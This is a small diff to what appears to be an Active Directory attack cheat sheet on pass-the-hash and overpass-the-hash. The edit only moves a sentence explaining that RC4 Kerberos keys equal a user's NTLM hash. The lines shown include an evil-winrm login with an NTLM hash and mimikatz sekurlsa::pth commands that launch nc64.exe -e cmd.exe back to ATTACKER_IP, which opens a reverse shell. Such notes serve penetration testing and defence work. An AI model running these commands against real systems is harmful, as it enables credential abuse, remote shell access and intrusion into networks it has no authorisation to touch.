@@ -210,5 +210,5 @@ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
         mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
         #If we have the AES256 hash:
         mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
+        #Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH).
     ```
-        - Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH).
